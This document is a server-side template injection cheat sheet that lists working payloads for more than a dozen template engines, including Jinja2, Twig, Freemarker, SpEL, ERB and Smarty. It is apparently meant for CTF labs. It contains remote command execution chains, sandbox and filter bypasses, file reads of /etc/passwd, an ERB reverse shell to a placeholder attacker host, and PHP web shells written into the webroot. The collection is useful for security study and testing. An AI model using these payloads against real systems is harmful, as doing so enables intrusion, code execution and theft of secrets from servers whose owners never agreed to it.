# SSTI — Cheat Sheet

Comprehensive payload reference per template engine. Detection workflow + quick reference in `ssti-quickstart.md`. Engine-specific deep dives in `ssti-advanced.md`.

## Detection

### Universal fuzzing string

```
${{<%[%'"}}%\
```

### Math probe by engine

```
{{7*7}}        Jinja2 / Twig / Smarty / Liquid → 49
${7*7}         Freemarker / Velocity / Spring SpEL → 49
<%= 7*7 %>     ERB → 49
${{7*7}}       Spring SpEL → 49
#{7*7}         Ruby ERB / Spring → 49
*{7*7}         Spring / OGNL → 49
@{7*7}         Thymeleaf → 49
{7*7}          Mustache → literal (no expressions)
```

### HTML sanitization bypass

`htmlspecialchars` default mode strips `&"` but NOT single quotes. Use single quotes:

```php
{{ ['cat /flag']|filter('system') }}    # works after htmlspecialchars
```

Hex entities for blocked chars:
```
&#x27; → '
&#x22; → "
```

### Context breakouts

```
}}{{<payload>}}                # close expression context
"}}{{<payload>}}{{             # close string literal
%22%7d%7d{{<payload>}}{{       # encoded
{{#comment}}{{/comment}}{{<payload>}}    # break out of comment
```

## ERB (Ruby) / Tornado (Python)

```
ERB:         <%= `id` %>  /  <%= system("id") %>  /  <%= File.read('/etc/passwd') %>
             <%= IO.popen("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'") %>
             <%= ENV['SECRET_KEY'] %>
Tornado:     {% import os %}{{ os.popen('id').read() }}
             {% import os %}{{ os.listdir('/') }}
```

## Jinja2 (Python)

```python
# Basic
{{ 7*7 }}
{{ config }}                                 # dump app config
{{ config.items() }}

# Object introspection
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[1].__subclasses__() }}

# RCE via subclasses (find Popen index)
{{ ''.__class__.__mro__[1].__subclasses__()[N]('cat /flag',shell=True,stdout=-1).communicate() }}

# RCE via globals (preferred)
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}              # short
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}

# Builtins access
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Request object (Flask)
{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read() }}

# File read
{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}
```

## Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}

<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign rt=oc("java.lang.ProcessBuilder", ["cat", "/flag"])>
${rt.start().inputStream.text}

// File read
${'java.io.BufferedReader'?new()(java.io.FileReader('/flag')).readLine()}
```

## Velocity / Spring SpEL / Apache OGNL

```
Velocity:    #set($s="")…$s.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id").getInputStream().toString()
SpEL:        ${T(java.lang.Runtime).getRuntime().exec("id")}
             ${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec("id").inputStream, T(java.nio.charset.Charset).forName("UTF-8"))}
OGNL:        %{(#cmd='id').(#runtime=@java.lang.Runtime@getRuntime()).(#runtime.exec(#cmd))}
OGNL bypass: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(...).(#cmd='id').(#runtime=@java.lang.Runtime@getRuntime()).(#runtime.exec(#cmd))}
```

## Twig (PHP)

```php
{{ 7*7 }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}        # Twig 1.x
{{ ['id'] | filter('system') }}        # Twig 2.x/3.x
{{ ['id'] | map('system') }}
{{ ['id'] | sort('system') }}
{{ ['id'] | reduce('system') }}

# Bypass disable_functions via file_put_contents (sort callback)
{{['<?php system($_GET[0]); ?>','/var/www/html/shell.php']|sort('file_put_contents')}}
```

## Node.js engines (Handlebars / EJS / Nunjucks / Pug)

```
EJS:         <%= require('child_process').execSync('id').toString() %>
Nunjucks:    {{range.constructor("return require('child_process').execSync('id').toString()")()}}
Pug:         - var process = global.process / = process.mainModule.require('child_process').execSync('id')
Handlebars:  Long lookup chain (constructor / split / each) — see ssti-advanced.md
```

## Mako / Smarty / Thymeleaf / JSP EL

```
Mako:        ${__import__('os').popen('cat /flag').read()}
Smarty:      {system('id')}  /  {passthru('cat /flag')}
             {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[0]); ?>",self::clearConfig())}
Thymeleaf:   __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
JSP EL:      ${''.getClass().forName('java.lang.Runtime').getMethod('exec',[Ljava.lang.String;).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),new String[]{'id'})}
```

## Sandbox escapes, filter bypasses, file-read

```
Jinja2 sandbox:    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
Twig sandbox:      {{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}

Jinja2 underscore-blocked:
  {%set u='%c'|format(95)%}{%set cc=u~u~'class'~u~u%}{%print ''|attr(cc)%}

Jinja2 quote-blocked (smuggle via request):
  {%print lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.d)(request.args.e)|attr(request.args.f)()%}
  ?a=__globals__&b=__getitem__&c=os&d=popen&e=id&f=read

File read:
  ERB:        <%= File.read('/flag') %>
  Jinja2:     {{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}
  Freemarker: ${'java.io.BufferedReader'?new()(java.io.FileReader('/flag')).readLine()}
  Twig:       {{ source('/flag') }}
```

## References

`ssti-quickstart.md`, `ssti-advanced.md`, `ssti-resources.md`. PayloadsAllTheThings, HackTricks, PortSwigger SSTI labs.
